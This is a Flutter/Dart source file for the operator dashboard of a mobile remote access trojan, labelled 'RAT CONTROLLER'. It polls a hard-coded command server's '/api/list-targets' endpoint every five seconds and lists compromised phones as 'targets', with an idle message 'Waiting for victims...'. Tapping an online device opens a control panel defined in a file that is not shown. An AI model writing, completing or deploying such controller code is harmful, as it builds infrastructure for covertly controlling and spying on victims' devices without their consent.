import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'control_panel.dart';

const String SERVER_URL = "http://gunturhosting.hoshino.my.id:3001";

class DeviceDashboardPage extends StatefulWidget {
  const DeviceDashboardPage({super.key});

  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> {
  List<dynamic> _devices = [];
  bool _isLoading = true;
  String _errorMessage = "";
  Timer? _timer;

  final Color primaryRed = const Color(0xFFE53935);
  final Color darkBg = const Color(0xFF1A1A1A);
  final Color cardBg = const Color(0xFF2D2D2D);
  final Color textWhite = const Color(0xFFFFFFFF);
  final Color textGray = const Color(0xFFB0B0B0);

  @override
  void initState() {
    super.initState();
    _fetchDevices();
    _timer = Timer.periodic(const Duration(seconds: 5), (timer) => _fetchDevices());
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  Future<void> _fetchDevices() async {
    if (!mounted) return;
    
    setState(() {
      _isLoading = true;
    });
    
    try {
      final response = await http.get(
        Uri.parse("$SERVER_URL/api/list-targets"),
        headers: {"Content-Type": "application/json"},
      ).timeout(const Duration(seconds: 10));

      if (response.statusCode == 200 && mounted) {
        final List<dynamic> data = jsonDecode(response.body);
        setState(() {
          _devices = data;
          _isLoading = false;
          _errorMessage = "";
        });
      } else {
        setState(() {
          _isLoading = false;
          _errorMessage = "Server error: ${response.statusCode}";
        });
      }
    } catch (e) {
      setState(() {
        _isLoading = false;
        _errorMessage = "Connection failed";
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    int onlineCount = 0;
    for (var d in _devices) {
      if (d['status'] == "Online") onlineCount++;
    }

    return Scaffold(
      backgroundColor: darkBg,
      appBar: AppBar(
        title: const Text(
          "RAT CONTROLLER",
          style: TextStyle(color: Color(0xFFE53935), fontWeight: FontWeight.bold, letterSpacing: 2, fontSize: 18),
        ),
        backgroundColor: darkBg,
        centerTitle: true,
        elevation: 0,
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(1),
          child: Container(color: primaryRed.withOpacity(0.5), height: 0.5),
        ),
        actions: [
          IconButton(
            icon: const Icon(Icons.refresh, color: Color(0xFFE53935)),
            onPressed: () {
              setState(() {
                _isLoading = true;
                _errorMessage = "";
                _fetchDevices();
              });
            },
          ),
        ],
      ),
      body: _isLoading
          ? Center(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  CircularProgressIndicator(color: primaryRed),
                  const SizedBox(height: 20),
                  Text("Loading targets...", style: TextStyle(color: textGray)),
                ],
              ),
            )
          : _errorMessage.isNotEmpty
              ? Center(
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Icon(Icons.wifi_off, color: primaryRed, size: 60),
                      const SizedBox(height: 20),
                      Text(_errorMessage, style: TextStyle(color: textGray, fontSize: 14)),
                      const SizedBox(height: 20),
                      ElevatedButton(
                        onPressed: () {
                          setState(() {
                            _isLoading = true;
                            _errorMessage = "";
                            _fetchDevices();
                          });
                        },
                        style: ElevatedButton.styleFrom(backgroundColor: primaryRed),
                        child: const Text("RETRY", style: TextStyle(color: Colors.white)),
                      ),
                    ],
                  ),
                )
              : _devices.isEmpty
                  ? Center(
                      child: Column(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(Icons.sensors_off, color: textGray, size: 50),
                          const SizedBox(height: 10),
                          Text("NO TARGETS FOUND", style: TextStyle(color: textGray)),
                          const SizedBox(height: 5),
                          Text("Waiting for victims...", style: TextStyle(color: textGray.withOpacity(0.5))),
                        ],
                      ),
                    )
                  : Column(
                      children: [
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 15),
                          color: cardBg,
                          child: Row(
                            mainAxisAlignment: MainAxisAlignment.spaceBetween,
                            children: [
                              Column(
                                children: [
                                  const Text("ONLINE", style: TextStyle(color: Color(0xFFE53935), fontSize: 11)),
                                  Text(
                                    "$onlineCount",
                                    style: const TextStyle(color: Color(0xFFE53935), fontSize: 28, fontWeight: FontWeight.bold),
                                  ),
                                ],
                              ),
                              Column(
                                children: [
                                  const Text("TOTAL", style: TextStyle(color: Colors.white54, fontSize: 11)),
                                  Text(
                                    "${_devices.length}",
                                    style: const TextStyle(color: Color(0xFFE53935), fontSize: 28, fontWeight: FontWeight.bold),
                                  ),
                                ],
                              ),
                            ],
                          ),
                        ),
                        const SizedBox(height: 10),
                        Expanded(
                          child: ListView.builder(
                            padding: const EdgeInsets.symmetric(horizontal: 12),
                            itemCount: _devices.length,
                            itemBuilder: (context, index) {
                              final device = _devices[index];
                              final isOnline = device['status'] == "Online";
                              final model = device['model'] ?? "Unknown";
                              final deviceId = device['id'] ?? "unknown";

                              return GestureDetector(
                                onTap: () {
                                  if (isOnline) {
                                    Navigator.push(
                                      context,
                                      MaterialPageRoute(
                                        builder: (context) => ControlPanelPage(device: device),
                                      ),
                                    );
                                  } else {
                                    ScaffoldMessenger.of(context).showSnackBar(
                                      SnackBar(
                                        content: Text("${model.split('|').first} is offline"),
                                        backgroundColor: primaryRed,
                                        duration: const Duration(seconds: 1),
                                      ),
                                    );
                                  }
                                },
                                child: Container(
                                  margin: const EdgeInsets.only(bottom: 10),
                                  padding: const EdgeInsets.all(15),
                                  decoration: BoxDecoration(
                                    color: cardBg,
                                    borderRadius: BorderRadius.circular(12),
                                    border: Border.all(
                                      color: isOnline ? primaryRed.withOpacity(0.5) : primaryRed.withOpacity(0.3),
                                      width: 1,
                                    ),
                                  ),
                                  child: Row(
                                    children: [
                                      Container(
                                        width: 45,
                                        height: 45,
                                        decoration: BoxDecoration(
                                          color: isOnline ? primaryRed.withOpacity(0.2) : primaryRed.withOpacity(0.1),
                                          borderRadius: BorderRadius.circular(10),
                                        ),
                                        child: Icon(
                                          Icons.phone_android,
                                          color: isOnline ? primaryRed : primaryRed.withOpacity(0.5),
                                          size: 24,
                                        ),
                                      ),
                                      const SizedBox(width: 15),
                                      Expanded(
                                        child: Column(
                                          crossAxisAlignment: CrossAxisAlignment.start,
                                          children: [
                                            Text(
                                              model.split('|').first,
                                              style: TextStyle(color: textWhite, fontSize: 14, fontWeight: FontWeight.bold),
                                            ),
                                            const SizedBox(height: 4),
                                            Text(
                                              deviceId.length > 20 ? "${deviceId.substring(0, 20)}..." : deviceId,
                                              style: TextStyle(color: textGray, fontSize: 10),
                                            ),
                                          ],
                                        ),
                                      ),
                                      Container(
                                        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                                        decoration: BoxDecoration(
                                          color: isOnline ? primaryRed.withOpacity(0.2) : primaryRed.withOpacity(0.1),
                                          borderRadius: BorderRadius.circular(12),
                                        ),
                                        child: Text(
                                          isOnline ? "ON" : "OFF",
                                          style: TextStyle(
                                            color: isOnline ? primaryRed : primaryRed.withOpacity(0.5),
                                            fontSize: 11,
                                            fontWeight: FontWeight.bold,
                                          ),
                                        ),
                                      ),
                                      if (isOnline)
                                        const Icon(Icons.chevron_right, color: Colors.white38)
                                      else
                                        const Icon(Icons.wifi_off, color: Colors.white24, size: 16),
                                    ],
                                  ),
                                ),
                              );
                            },
                          ),
                        ),
                      ],
                    ),
    );
  }
}